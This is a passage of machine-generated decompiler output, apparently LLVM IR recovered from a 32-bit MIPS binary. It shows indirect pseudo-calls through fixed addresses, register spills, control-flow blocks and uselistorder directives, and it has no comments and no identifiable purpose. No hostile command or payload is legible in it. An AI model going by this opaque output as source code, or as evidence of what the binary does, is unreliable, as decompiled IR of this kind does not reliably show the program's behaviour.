  store i32 %v3_40186c, i32* %t9.global-to-local, align 4
  %v1_401874 = load i32, i32* %s1.global-to-local, align 4
  %v2_401874 = load i32, i32* %s0.global-to-local, align 4
  %v3_401874 = add i32 %v2_401874, %v1_401874
  store i32 %v3_401874, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40186c)
  store i32 %v2_4013cc, i32* %a0.global-to-local, align 4
  %v3_401884 = load i32, i32* inttoptr (i32 2036987211 to i32*), align 4
  store i32 %v3_401884, i32* %t9.global-to-local, align 4
  store i32 %v2_4013dc, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401884)
  store i32 -1, i32* @v1, align 4
  %v0_40189c = load i32, i32* %v0.global-to-local, align 4
  %v2_40189c = icmp eq i32 %v0_40189c, -1
  br i1 %v2_40189c, label %dec_label_pc_401b64, label %dec_label_pc_4018a0

dec_label_pc_4018a0:                              ; preds = %dec_label_pc_4017d8
  %v3_4018a4 = load i32, i32* inttoptr (i32 2036987239 to i32*), align 4
  store i32 %v3_4018a4, i32* %t9.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4018a4)
  %v0_4018b8 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4018b8, i32* %a1.global-to-local, align 4
  %v3_4018bc = load i32, i32* inttoptr (i32 2036986835 to i32*), align 4
  store i32 %v3_4018bc, i32* %t9.global-to-local, align 4
  store i32 %v2_4013cc, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4018bc)
  %v3_4018d4 = load i32, i32* inttoptr (i32 2036987051 to i32*), align 4
  store i32 %v3_4018d4, i32* %t9.global-to-local, align 4
  store i32 %v2_4013cc, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4018d4)
  %v0_4018e8 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_4018e8, i32* %a1.global-to-local, align 4
  %v3_4018ec = load i32, i32* inttoptr (i32 2036986835 to i32*), align 4
  store i32 %v3_4018ec, i32* %t9.global-to-local, align 4
  %v1_4018f4 = load i32, i32* %s1.global-to-local, align 4
  %v2_4018f4 = load i32, i32* %v0.global-to-local, align 4
  %v3_4018f4 = add i32 %v2_4018f4, %v1_4018f4
  store i32 %v3_4018f4, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4018ec)
  %v3_401904 = load i32, i32* inttoptr (i32 2036987051 to i32*), align 4
  store i32 %v3_401904, i32* %t9.global-to-local, align 4
  store i32 %v2_4013cc, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401904)
  store i32 5, i32* %a0.global-to-local, align 4
  %v3_40191c = load i32, i32* inttoptr (i32 2036987239 to i32*), align 4
  store i32 %v3_40191c, i32* %t9.global-to-local, align 4
  %v1_401924 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_401924, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40191c)
  %v0_401930 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_401930, i32* %a1.global-to-local, align 4
  %v3_401934 = load i32, i32* inttoptr (i32 2036986835 to i32*), align 4
  store i32 %v3_401934, i32* %t9.global-to-local, align 4
  %v1_40193c = load i32, i32* %s1.global-to-local, align 4
  %v2_40193c = load i32, i32* %s0.global-to-local, align 4
  %v3_40193c = add i32 %v2_40193c, %v1_40193c
  store i32 %v3_40193c, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401934)
  %v3_40194c = load i32, i32* inttoptr (i32 2036986915 to i32*), align 4
  store i32 %v3_40194c, i32* %t9.global-to-local, align 4
  store i32 %v2_4013cc, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40194c)
  %v0_401960 = load i32, i32* %v0.global-to-local, align 4
  %v1_401960 = icmp eq i32 %v0_401960, 0
  store i32 %v0_401960, i32* %s2.global-to-local, align 4
  br i1 %v1_401960, label %dec_label_pc_4018a0.dec_label_pc_401970_crit_edge, label %dec_label_pc_401b0c

dec_label_pc_4018a0.dec_label_pc_401970_crit_edge: ; preds = %dec_label_pc_4018a0
  %v0_401970.pre = load i32, i32* %t9.global-to-local, align 4
  br label %dec_label_pc_401970

dec_label_pc_401970:                              ; preds = %dec_label_pc_4018a0.dec_label_pc_401970_crit_edge, %dec_label_pc_401b0c
  %v0_401970 = phi i32 [ %v0_401970.pre, %dec_label_pc_4018a0.dec_label_pc_401970_crit_edge ], [ %v3_401b2c, %dec_label_pc_401b0c ]
  call void @__pseudo_call(i32 %v0_401970)
  %v3_401980 = load i32, i32* inttoptr (i32 2036987239 to i32*), align 4
  store i32 %v3_401980, i32* %t9.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401980)
  %v0_401994 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_401994, i32* %a1.global-to-local, align 4
  %v3_401998 = load i32, i32* inttoptr (i32 2036986835 to i32*), align 4
  store i32 %v3_401998, i32* %t9.global-to-local, align 4
  store i32 %v2_4013cc, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401998)
  %v3_4019b0 = load i32, i32* inttoptr (i32 2036987051 to i32*), align 4
  store i32 %v3_4019b0, i32* %t9.global-to-local, align 4
  store i32 %v2_4013cc, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4019b0)
  %v0_4019c4 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_4019c4, i32* %a1.global-to-local, align 4
  %v3_4019c8 = load i32, i32* inttoptr (i32 2036986835 to i32*), align 4
  store i32 %v3_4019c8, i32* %t9.global-to-local, align 4
  %v1_4019d0 = load i32, i32* %s1.global-to-local, align 4
  %v2_4019d0 = load i32, i32* %v0.global-to-local, align 4
  %v3_4019d0 = add i32 %v2_4019d0, %v1_4019d0
  store i32 %v3_4019d0, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4019c8)
  %v3_4019e0 = load i32, i32* inttoptr (i32 2036987051 to i32*), align 4
  store i32 %v3_4019e0, i32* %t9.global-to-local, align 4
  store i32 %v2_4013cc, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4019e0)
  store i32 5, i32* %a0.global-to-local, align 4
  %v3_4019f8 = load i32, i32* inttoptr (i32 2036987239 to i32*), align 4
  store i32 %v3_4019f8, i32* %t9.global-to-local, align 4
  %v1_401a00 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_401a00, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4019f8)
  %v0_401a0c = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_401a0c, i32* %a1.global-to-local, align 4
  %v3_401a10 = load i32, i32* inttoptr (i32 2036986835 to i32*), align 4
  store i32 %v3_401a10, i32* %t9.global-to-local, align 4
  %v1_401a18 = load i32, i32* %s1.global-to-local, align 4
  %v2_401a18 = load i32, i32* %s0.global-to-local, align 4
  %v3_401a18 = add i32 %v2_401a18, %v1_401a18
  store i32 %v3_401a18, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401a10)
  %v3_401a28 = load i32, i32* inttoptr (i32 2036987051 to i32*), align 4
  store i32 %v3_401a28, i32* %t9.global-to-local, align 4
  store i32 %v2_4013cc, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401a28)
  %v0_401a3c = load i32, i32* %s1.global-to-local, align 4
  %v1_401a3c = load i32, i32* %v0.global-to-local, align 4
  %v2_401a3c = add i32 %v1_401a3c, %v0_401a3c
  store i32 %v2_401a3c, i32* %a0.global-to-local, align 4
  %v3_401a40 = load i32, i32* inttoptr (i32 2036986579 to i32*), align 4
  store i32 %v3_401a40, i32* %a1.global-to-local, align 4
  %v3_401a44 = load i32, i32* inttoptr (i32 2036986835 to i32*), align 4
  store i32 %v3_401a44, i32* %t9.global-to-local, align 4
  %v2_401a4c = add i32 %v3_401a40, -32408
  store i32 %v2_401a4c, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401a44)
  %v3_401a5c = load i32, i32* inttoptr (i32 2036987051 to i32*), align 4
  store i32 %v3_401a5c, i32* %t9.global-to-local, align 4
  store i32 %v2_4013cc, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401a5c)
  %v0_401a70 = load i32, i32* %s1.global-to-local, align 4
  %v1_401a70 = load i32, i32* %v0.global-to-local, align 4
  %v2_401a70 = add i32 %v1_401a70, %v0_401a70
  store i32 %v2_401a70, i32* %a0.global-to-local, align 4
  %v3_401a74 = load i32, i32* inttoptr (i32 2036986835 to i32*), align 4
  store i32 %v3_401a74, i32* %t9.global-to-local, align 4
  %v1_401a7c = load i32, i32* @s5, align 4
  %v2_401a7c = add i32 %v1_401a7c, 11
  store i32 %v2_401a7c, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401a74)
  store i32 %v2_4013cc, i32* %a0.global-to-local, align 4
  %v3_401a8c = load i32, i32* inttoptr (i32 2036987211 to i32*), align 4
  store i32 %v3_401a8c, i32* %t9.global-to-local, align 4
  store i32 %v2_4013dc, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401a8c)
  %v3_401aa4 = load i32, i32* inttoptr (i32 2036987051 to i32*), align 4
  store i32 %v3_401aa4, i32* %t9.global-to-local, align 4
  %v0_401aa8 = load i32, i32* %v0.global-to-local, align 4
  %v1_401aa8 = load i32, i32* @s7, align 4
  %v2_401aa8 = icmp eq i32 %v0_401aa8, %v1_401aa8
  store i32 %v2_4013dc, i32* %a0.global-to-local, align 4
  br i1 %v2_401aa8, label %dec_label_pc_401b0c, label %dec_label_pc_401aac

dec_label_pc_401aac:                              ; preds = %dec_label_pc_401970
  call void @__pseudo_call(i32 %v3_401aa4)
  store i32 %v2_4013dc, i32* %a0.global-to-local, align 4
  %v3_401ac0 = load i32, i32* inttoptr (i32 2036987267 to i32*), align 4
  store i32 %v3_401ac0, i32* %t9.global-to-local, align 4
  %v0_401ac4 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_401ac4, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401ac0)
  store i32 10, i32* %a1.global-to-local, align 4
  %v3_401ad8 = load i32, i32* inttoptr (i32 2036987163 to i32*), align 4
  store i32 %v3_401ad8, i32* %t9.global-to-local, align 4
  %v0_401adc = load i32, i32* %v0.global-to-local, align 4
  %v1_401adc = load i32, i32* @s7, align 4
  %v2_401adc = icmp eq i32 %v0_401adc, %v1_401adc
  %v3_401adc = load i32, i32* %s4.global-to-local, align 4
  store i32 %v3_401adc, i32* %a0.global-to-local, align 4
  br i1 %v2_401adc, label %dec_label_pc_401b0c, label %dec_label_pc_401ae0

dec_label_pc_401ae0:                              ; preds = %dec_label_pc_401aac
  store i32 1, i32* %fp.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401ad8)
  %v0_401af0 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_401af0, i32* %a0.global-to-local, align 4
  %v3_401af4 = load i32, i32* inttoptr (i32 2036987083 to i32*), align 4
  store i32 %v3_401af4, i32* %t9.global-to-local, align 4
  store i32 9, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401af4)
  br label %dec_label_pc_401b0c

dec_label_pc_401b0c:                              ; preds = %dec_label_pc_4018a0, %dec_label_pc_401aac, %dec_label_pc_401970, %dec_label_pc_401ae0
  %v3_401b0c = load i32, i32* inttoptr (i32 2036987167 to i32*), align 4
  store i32 %v3_401b0c, i32* %t9.global-to-local, align 4
  %v1_401b14 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_401b14, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401b0c)
  store i32 %v2_4013cc, i32* %s1.global-to-local, align 4
  %v0_401b28 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_401b28, i32* @s5, align 4
  %v3_401b2c = load i32, i32* inttoptr (i32 2036987231 to i32*), align 4
  store i32 %v3_401b2c, i32* %t9.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 %v2_4013dc, i32* %a0.global-to-local, align 4
  %v1_401b3c = icmp ne i32 %v0_401b28, 0
  store i32 -1, i32* @s7, align 4
  %v0_401b44 = load i32, i32* %fp.global-to-local, align 4
  %v1_401b44 = icmp eq i32 %v0_401b44, 0
  %or.cond = and i1 %v1_401b3c, %v1_401b44
  br i1 %or.cond, label %dec_label_pc_401970, label %dec_label_pc_401b4c

dec_label_pc_401b4c:                              ; preds = %dec_label_pc_401b0c
  %v3_401b4c = load i32, i32* inttoptr (i32 2036986755 to i32*), align 4
  store i32 %v3_401b4c, i32* %t9.global-to-local, align 4
  %v1_401b54 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_401b54, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401b4c)
  br label %dec_label_pc_401b64

dec_label_pc_401b64:                              ; preds = %dec_label_pc_4017d8, %dec_label_pc_4017c0, %dec_label_pc_401b4c
  %v3_401b64 = load i32, i32* inttoptr (i32 2036987167 to i32*), align 4
  store i32 %v3_401b64, i32* %t9.global-to-local, align 4
  %v1_401b6c = load i32, i32* %s6.global-to-local, align 4
  store i32 %v1_401b6c, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401b64)
  %v0_401b78 = load i32, i32* %v0.global-to-local, align 4
  %v1_401b78 = icmp ne i32 %v0_401b78, 0
  store i32 %v0_401b78, i32* %a0.global-to-local, align 4
  %v0_401b80 = load i32, i32* %fp.global-to-local, align 4
  %v1_401b80 = icmp eq i32 %v0_401b80, 0
  %or.cond2 = and i1 %v1_401b78, %v1_401b80
  br i1 %or.cond2, label %dec_label_pc_4017c0, label %dec_label_pc_401b88

dec_label_pc_401b88:                              ; preds = %dec_label_pc_401b64
  %v3_401b88 = load i32, i32* inttoptr (i32 2036986755 to i32*), align 4
  store i32 %v3_401b88, i32* %t9.global-to-local, align 4
  %v1_401b90 = load i32, i32* %s6.global-to-local, align 4
  store i32 %v1_401b90, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401b88)
  %v3_401ba0 = load i32, i32* inttoptr (i32 2036987195 to i32*), align 4
  store i32 %v3_401ba0, i32* %t9.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401ba0)
  %v3_401bb8 = load i32, i32* inttoptr (i32 2036987115 to i32*), align 4
  store i32 %v3_401bb8, i32* %t9.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401bb8)
  %v3_401bd0 = load i32, i32* inttoptr (i32 2036987115 to i32*), align 4
  store i32 %v3_401bd0, i32* %t9.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401bd0)
  %v3_401be8 = load i32, i32* inttoptr (i32 2036987115 to i32*), align 4
  store i32 %v3_401be8, i32* %t9.global-to-local, align 4
  store i32 5, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401be8)
  %v3_401c00 = load i32, i32* inttoptr (i32 2036987115 to i32*), align 4
  store i32 %v3_401c00, i32* %t9.global-to-local, align 4
  store i32 4, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401c00)
  %v0_401c10 = load i32, i32* %fp.global-to-local, align 4
  %v1_401c10 = mul i32 %v0_401c10, 16777216
  %v1_401c18 = sdiv i32 %v1_401c10, 16777216
  store i32 %v1_401c18, i32* %v0.global-to-local, align 4
  store i32 %v0_401394, i32* @ra, align 4
  store i32 %v0_40139c, i32* @s7, align 4
  store i32 %v0_4013a4, i32* @s5, align 4
  store i32 %v0_4013ac, i32* @s3, align 4
  store i32 %v0_4013b4, i32* @s1, align 4
  store i32 %v0_4013b8, i32* @s0, align 4
  ret i32 %v1_401c18

; uselistorder directives
  uselistorder i32 %v1_401c18, { 1, 0 }
  uselistorder i32 %v0_401b78, { 1, 2, 0 }
  uselistorder i32 %v3_401b2c, { 1, 0 }
  uselistorder i32 %v3_401664, { 1, 0 }
  uselistorder i32 %v0_40165c, { 1, 0 }
  uselistorder i32 %v1_401680, { 1, 0, 2 }
  uselistorder i32 %v3_401638, { 1, 0 }
  uselistorder i32 %v0_40164820, { 1, 0 }
  uselistorder i32 %v0_401618, { 1, 0 }
  uselistorder i32 %v0_40164822, { 1, 0 }
  uselistorder i32 %v2_401640, { 2, 3, 0, 1 }
  uselistorder i32 %v0_40161815, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v4_40156c, { 1, 0 }
  uselistorder i32 %v3_401564, { 1, 0 }
  uselistorder i32 %v0_40155c, { 1, 0 }
  uselistorder i32 %v2_401550, { 1, 0, 2, 3 }
  uselistorder i32 %v1_40154c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_401540, { 1, 0 }
  uselistorder i32 %v3_401540, { 0, 1, 3, 2 }
  uselistorder i32 %v2_40140c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_4013f4, { 3, 4, 0, 5, 1, 2, 6, 7 }
  uselistorder i8* %stack_var_-8768, { 1, 0 }
  uselistorder i32* %v1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %v0.global-to-local, { 0, 54, 69, 70, 71, 72, 73, 74, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 75, 76, 77, 78, 79, 21, 20, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %t9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 60, 61, 62, 63, 64, 65, 66, 67, 68, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32* %s4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %s1.global-to-local, { 7, 14, 8, 9, 10, 11, 12, 13, 15, 16, 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i32* %fp.global-to-local, { 3, 1, 2, 0, 4, 5 }
  uselistorder i32* %a1.global-to-local, { 54, 55, 56, 57, 58, 59, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 60, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 40, 41, 43, 42, 44, 45, 46, 47, 48, 50, 49, 51, 52, 53 }
  uselistorder i32* %a0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 82, 83, 84, 85, 86, 87, 88, 89, 90, 8, 9, 11, 10, 12, 14, 13, 15, 16, 17, 19, 18, 20, 22, 21, 23, 24, 25, 26, 27, 28, 30, 29, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81 }
  uselistorder i32* inttoptr (i32 2036987211 to i32*), { 1, 0 }
  uselistorder i32* inttoptr (i32 2036986915 to i32*), { 1, 0 }
  uselistorder i32* inttoptr (i32 2036987115 to i32*), { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder i32* inttoptr (i32 2036986835 to i32*), { 10, 0, 9, 8, 7, 6, 5, 4, 3, 2, 1, 11 }
  uselistorder i32* inttoptr (i32 2036987239 to i32*), { 7, 6, 5, 4, 3, 0, 1, 2 }
  uselistorder i32* inttoptr (i32 2036986899 to i32*), { 2, 1, 0, 3 }
  uselistorder i32* inttoptr (i32 2036987051 to i32*), { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0, 1, 2 }
  uselistorder i32* inttoptr (i32 2036986951 to i32*), { 3, 2, 1, 0 }
  uselistorder i32 23, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i32 (i32, i32, i32)* @function_400fc4, { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_401b64, { 2, 0, 1 }
  uselistorder label %dec_label_pc_401b0c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_401970, { 1, 0 }
  uselistorder label %dec_label_pc_4017b8, { 1, 0 }
  uselistorder label %dec_label_pc_40177c, { 1, 0 }
  uselistorder label %dec_label_pc_4016c4, { 5, 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_401678, { 1, 0 }
  uselistorder label %dec_label_pc_401630, { 1, 0 }
  uselistorder label %dec_label_pc_401618, { 1, 0 }
  uselistorder label %dec_label_pc_401614, { 2, 0, 1 }
  uselistorder label %dec_label_pc_40160c, { 1, 0 }
  uselistorder label %dec_label_pc_401578, { 1, 0 }
  uselistorder label %dec_label_pc_401528, { 1, 0 }
  uselistorder label %dec_label_pc_401484, { 1, 0 }
}

define i32 @function_401c4c() local_unnamed_addr {
dec_label_pc_401c4c:
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1_401c54 = load i32, i32* @t9, align 4
  %v2_401c54 = add i32 %v1_401c54, 324996
  store i32 %v2_401c54, i32* %gp.global-to-local, align 4
  %v0_401c5c = load i32, i32* @ra, align 4
  %v0_401c60 = load i32, i32* @s0, align 4
  %v3_401c68 = load i32, i32* @global_var_4491e8.9, align 4
  store i32 %v3_401c68, i32* @s0, align 4
  %v3_401c6c = load i32, i32* @global_var_44928c.150, align 4
  store i32 %v3_401c6c, i32* @t9, align 4
  %v3_401c70 = load i32, i32* @global_var_449028.151, align 4
  %v2_401c74 = call i32 @function_4049d0(i32 %v3_401c70)
  store i32 %v2_401c54, i32* %gp.global-to-local, align 4
  %v3_401c84 = load i32, i32* @global_var_4491e8.9, align 4
  %v3_401c88 = load i32, i32* @global_var_449284.12, align 4
  store i32 %v3_401c88, i32* @t9, align 4
  %v3_401c8c = load i32, i32* @global_var_449518.152, align 4
  store i32 -1, i32* @global_var_449028.151, align 4
  store i32 %v3_401c84, i32* @v0, align 4
  %v1_401ca0 = icmp eq i32 %v3_401c8c, 0
  store i8 0, i8* @global_var_449514.153, align 1
  br i1 %v1_401ca0, label %dec_label_pc_401cb8, label %dec_label_pc_401ca4

dec_label_pc_401ca4:                              ; preds = %dec_label_pc_401c4c
  %v2_401ca8 = call i32 @function_405f40(i32 %v3_401c8c)
  store i32 %v2_401ca8, i32* @v0, align 4
  store i32 %v2_401c54, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_401cb8

dec_label_pc_401cb8:                              ; preds = %dec_label_pc_401c4c, %dec_label_pc_401ca4
  %v3_401cb8 = load i32, i32* @global_var_449454.5, align 4
  store i32 %v3_401cb8, i32* @t9, align 4
  store i32 %v0_401c5c, i32* @ra, align 4
  store i32 %v0_401c60, i32* %s0.global-to-local, align 4
  %v5_401cc8 = call i32 @function_406440(i32 10)
  store i32 %v5_401cc8, i32* %v0.global-to-local, align 4
  %v1_401cd8 = load i32, i32* @t9, align 4
  %v2_401cd8 = add i32 %v1_401cd8, 324864
  store i32 %v2_401cd8, i32* %gp.global-to-local, align 4
  %v0_401ce4 = load i32, i32* @s3, align 4
  %v0_401cec = load i32, i32* @s1, align 4
  %v0_401cf0 = load i32, i32* @s0, align 4
  store i32 1, i32* %s3.global-to-local, align 4
  %v1_401cfc = add i32 %v1_401cd8, 292724
  %v2_401cfc = inttoptr i32 %v1_401cfc to i32*
  %v3_401cfc = load i32, i32* %v2_401cfc, align 4
  %v1_401d08 = add i32 %v1_401cd8, 292120
  %v2_401d08 = inttoptr i32 %v1_401d08 to i32*
  %v3_401d08 = load i32, i32* %v2_401d08, align 4
  store i32 %v3_401d08, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401cfc)
  store i32 %v2_401cd8, i32* %gp.global-to-local, align 4
  store i32 1, i32* %s1.global-to-local, align 4
  %v1_401d20 = add i32 %v1_401cd8, 292588
  %v2_401d20 = inttoptr i32 %v1_401d20 to i32*
  %v3_401d20 = load i32, i32* %v2_401d20, align 4
  %v2_401d34 = icmp eq i32 %v5_401cc8, -1
  %v4_401d34 = load i32, i32* %s0.global-to-local, align 4
  %v5_401d34 = add i32 %v4_401d34, -28636
  %v6_401d34 = inttoptr i32 %v5_401d34 to i32*
  store i32 %v5_401cc8, i32* %v6_401d34, align 4
  br i1 %v2_401d34, label %dec_label_pc_401e04, label %dec_label_pc_401d38

dec_label_pc_401d38:                              ; preds = %dec_label_pc_401cb8
  store i32 4, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401d20)
  store i32 %v2_401cd8, i32* %gp.global-to-local, align 4
  %v0_401d50 = load i32, i32* %s0.global-to-local, align 4
  %v1_401d50 = add i32 %v0_401d50, -28636
  %v2_401d50 = inttoptr i32 %v1_401d50 to i32*
  %v3_401d50 = load i32, i32* %v2_401d50, align 4
  store i32 %v3_401d50, i32* %s0.global-to-local, align 4
  %v1_401d54 = add i32 %v1_401cd8, 292292
  %v2_401d54 = inttoptr i32 %v1_401d54 to i32*
  %v3_401d54 = load i32, i32* %v2_401d54, align 4
  call void @__pseudo_call(i32 %v3_401d54)
  store i32 %v2_401cd8, i32* %gp.global-to-local, align 4
  %v3_401d70 = load i32, i32* %v2_401d54, align 4
  call void @__pseudo_call(i32 %v3_401d70)
  store i32 2130706432, i32* %v0.global-to-local, align 4
  store i32 %v2_401cd8, i32* %gp.global-to-local, align 4
  %v0_401d88 = load i32, i32* %s3.global-to-local, align 4
  %v1_401d88 = load i32, i32* %s1.global-to-local, align 4
  %v2_401d88 = icmp eq i32 %v0_401d88, %v1_401d88
  br i1 %v2_401d88, label %dec_label_pc_401d9c, label %dec_label_pc_401d8c

dec_label_pc_401d8c:                              ; preds = %dec_label_pc_401d38
  %v1_401d90 = add i32 %v1_401cd8, 292800
  %v2_401d90 = inttoptr i32 %v1_401d90 to i32*
  %v3_401d90 = load i32, i32* %v2_401d90, align 4
  store i32 %v3_401d90, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_401d9c

dec_label_pc_401d9c:                              ; preds = %dec_label_pc_401d38, %dec_label_pc_401d8c
  store i32 2, i32* %v0.global-to-local, align 4
  %v1_401da0 = add i32 %v1_401cd8, 292368
  %v2_401da0 = inttoptr i32 %v1_401da0 to i32*
  %v3_401da0 = load i32, i32* %v2_401da0, align 4
  store i32 8896, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401da0)
  store i32 %v2_401cd8, i32* %gp.global-to-local, align 4
  store i32 0, i32* inttoptr (i32 8896 to i32*), align 64
  %v1_401dc0 = add i32 %v1_401cd8, 292120
  %v2_401dc0 = inttoptr i32 %v1_401dc0 to i32*
  %v3_401dc0 = load i32, i32* %v2_401dc0, align 4
  store i32 %v3_401dc0, i32* %s1.global-to-local, align 4
  %v1_401dc4 = add i32 %v1_401cd8, 292620
  %v2_401dc4 = inttoptr i32 %v1_401dc4 to i32*
  %v3_401dc4 = load i32, i32* %v2_401dc4, align 4
  %v1_401dd8 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_401dd8, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401dc4)
  store i32 %v2_401cd8, i32* %gp.global-to-local, align 4
  %v1_401de4 = icmp eq i32 %v1_401dd8, 0
  store i32 126, i32* %v0.global-to-local, align 4
  br i1 %v1_401de4, label %dec_label_pc_401d9c.dec_label_pc_401e20_crit_edge, label %dec_label_pc_401de8

dec_label_pc_401d9c.dec_label_pc_401e20_crit_edge: ; preds = %dec_label_pc_401d9c
  %v0_401e20.pre = load i32, i32* %s3.global-to-local, align 4
  br label %dec_label_pc_401e20

dec_label_pc_401de8:                              ; preds = %dec_label_pc_401d9c
  %v0_401dec = load i32, i32* %s0.global-to-local, align 4
  %v1_401dec = inttoptr i32 %v0_401dec to i32*
  %v2_401dec = load i32, i32* %v1_401dec, align 4
  %v2_401df4 = icmp eq i32 %v2_401dec, 126
  store i32 13, i32* %v0.global-to-local, align 4
  br i1 %v2_401df4, label %dec_label_pc_401e04, label %dec_label_pc_401df8

dec_label_pc_401df8:                              ; preds = %dec_label_pc_401de8
  %v2_401dfc = icmp eq i32 %v2_401dec, 13
  br i1 %v2_401dfc, label %dec_label_pc_401e04, label %dec_label_pc_401e4c

dec_label_pc_401e04:                              ; preds = %dec_label_pc_401df8, %dec_label_pc_401de8, %dec_label_pc_401cb8
  %v0_401e04 = load i32, i32* %s3.global-to-local, align 4
  %v1_401e04 = add i32 %v0_401e04, 1
  %v1_401e08 = urem i32 %v1_401e04, 256
  store i32 %v1_401e08, i32* %s3.global-to-local, align 4
  %v2_401e10 = icmp eq i32 %v1_401e08, 3
  store i32 0, i32* %v0.global-to-local, align 4
  br i1 %v2_401e10, label %dec_label_pc_401ed0, label %dec_label_pc_401e20

